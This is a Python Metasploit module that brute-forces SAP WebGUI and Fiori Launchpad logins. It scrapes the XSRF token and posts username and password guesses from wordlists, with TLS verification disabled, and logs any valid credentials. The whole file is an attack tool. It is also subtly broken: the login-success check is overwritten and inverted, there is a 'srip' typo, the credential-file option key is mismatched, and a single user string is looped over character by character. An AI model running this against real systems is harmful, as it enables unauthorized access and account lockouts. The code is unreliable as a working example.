#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# standard modules
import logging

# extra modules
DEPENDENCIES_MISSING = False
try:
    import requests
    from urllib3.exceptions import InsecureRequestWarning
    from bs4 import BeautifulSoup
except ImportError:
    DEPENDENCIES_MISSING = True

from metasploit import module
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

metadata = {
    'name': 'SAP Web GUI & Fiori Launchpad Bruteforce',
    'description': '''
        This module attempts to brute force SAP user and passwords through the SAP WebGUI or Fiori Launchpad service.
        Default clients can be tested without needing to set a CLIENT.
        Keep in mind, that login/fails_to_user_lock parameter allows a maximum of 99 failed logins.
    ''',
    'references': [],
    'authors': [
        'Julian Petersohn <julian@petersohn.it>'
    ],
    'date': '2021-06-03',
    'license': 'MSF_LICENSE',
    'type': 'single_scanner',
    'options': {
        'TARGETURI': {'type': 'string', 'description': 'The base path', 'required': True, 'default': '/sap/bc/gui/sap/its/webgui'},
        'RPORT': {'type': 'port', 'description': 'Target port', 'required': True},
        'SAP_SID': {'type': 'string', 'description': 'Target SAP SID', 'required': True},
        'SAP_CLIENT': {'type': 'string', 'description': 'Target SAP client', 'required': False, 'default': '001'},
        'BRUTE_MODE': {'type': 'string', 'description': 'Which endpoint you want to attack (webgui/fiori)', 'required': False, 'default': 'webgui'},
        'SSL': {'type': 'bool', 'description': 'use SSL (true/false)', 'required': True, 'default': False},
        'CRED_FILE': {'type': 'string', 'description': 'Wordlist with users and passwords separated by : (Example: user:password)', 'required': False},
        'USER_FILE': {'type': 'string', 'description': 'Wordlist with users', 'required': False},
        'PASS_FILE': {'type': 'string', 'description': 'Wordlist with passwords', 'required': False}
    }
}

def build_url(args):
    if args['SSL'] == "true":
        url =  "https://{}:{}{}".format(str(args['RHOSTS']), str(args['RPORT']), str(args['TARGETURI']))
    else:
        url =  "http://{}:{}{}".format(str(args['RHOSTS']), str(args['RPORT']), str(args['TARGETURI']))
    return str(url)

def fiori_login(url, user, password, client):
    session = requests.session()
    response = session.get(url, verify=False, allow_redirects=True)
    soup = BeautifulSoup(response.text, 'lxml')
    csrf_token = soup.select('input', name="sap-login-XSRF")[6]
    xsrf_cookie = csrf_token['value']

    post_parameters = {
	'sap-system-login-oninputprocessing':'onLogin',
	'sap-urlscheme':'',
	'sap-system-login':'onLogin',
	'sap-system-login-basic_auth':'',
	'sap-client':client,
	'sap-accessibility':'',
	'sap-login-XSRF': xsrf_cookie,
	'sap-system-login-cookie_disabled':'',
	'sap-hash':'',
	'sap-user':user,
	'sap-password':password,
	'sap-language':'EN'
	}
    response = session.post(url, data=post_parameters, verify=False)
    login_success = (response.status_code == 200) and (len(response.history)>0)
    login_success = not (response.status_code == 200) and (len(response.history)>0)
    return login_success

def webgui_login(url, user, password, client, sid):

    session = requests.session()
    response = session.get(url, verify=False, allow_redirects=True)
    response = session.get(url, verify=False, allow_redirects=True)
    soup = BeautifulSoup(response.text, 'lxml')
    csrf_token = soup.select('input', name="sap-login-XSRF")[6]
    xsrf_cookie = csrf_token['value']

    post_parameters = {
        'FOCUS_ID': 'sap-user',
        'sap-system-login-oninputprocessing': 'onLogin',
        'sap-urlscheme': '',
        'sap-system-login': 'onLogin',
        'sap-system-login-basic_auth': '',
        'sap-accessibility': '',
        'sap-login-XSRF': xsrf_cookie,
        'sap-system-login-cookie_disabled': '',
        'sysid': sid,
        'sap-client': client,
        'sap-user': user,
        'sap-password': password,
        'sap-language': 'EN',
        'sap-language-dropdown': 'English'
    }

    response = session.post(url, data=post_parameters, verify=False)
    login_success = (response.status_code == 200) and (len(response.history)>0)
    login_success = not (response.status_code == 200) and (len(response.history)>0)
    return login_success

def bruteforce(users, password, url, args):
    for user in users:
        module.log("trying: {}:{}".format(user, password), "debug")
        if args['BRUTE_MODE'] == "webgui":
            login_success = webgui_login(url = url, user = user, password = password, client = args['SAP_CLIENT'], sid = args['SAP_SID'])
        elif args['BRUTE_MODE'] == "fiori":
            login_success = fiori_login(url = url, user = user, password = password, client = args['SAP_CLIENT'])
        else:
            module.log("wronge endpoint defined (webgui / fiori)... aborting!", "error")
            raise SystemExit(0)
        if login_success:
            module.log("Valid credential {}:{}".format(user, password), "info")
            raise SystemExit(0)
        else:
            pass

def load_wordlist(args):
    user_list = []
    pw_list = []
    with open(args['USER_FILE'], "r", encoding="utf-8") as user_file:
        for user in user_file:
            user = user.strip("\n")
            user_list.append(user)
    module.log("users loaded", "debug")
    with open(args['PASS_FILE'], "r", encoding="utf-8") as pwfile:
        for password in pwfile:
            password = password.srip("\n")
            pw_list.append(password)
    module.log("passwords loaded", "debug")
    return user_list, pw_list

def run(args):
    module.LogHandler.setup(msg_prefix='{} - '.format(args['rhost']))
    if DEPENDENCIES_MISSING:
        logging.error('Module dependency is missing, cannot continue!')
        return
    url = build_url(args)

    if len(args['CRED_FILE']>0):
        with open(args['CREDENTIAL_FILE'], "r", encoding="utf-8") as credfile:
            for line in credfile:
                line = line.strip()
                user,password = line.split(":", 1)
                try:
                    bruteforce(url = url, users = user, password = password, args=args)
                except Exception as error:
                    logging.error('%s', error)
                    pass
    elif (len(args['USER_FILE'])>0) and (len(args['PASS_FILE'])>0):
        users, passwords = load_wordlist(args)
        try:
            for password in passwords:
                bruteforce(url = url, users = users, password = password, args=args)
        except Exception as error:
            logging.error('%s', error)
            pass
    else:
        logging.error("please check username/password or credential file for existence or format issues")

if __name__ == '__main__':
    module.run(metadata, run)
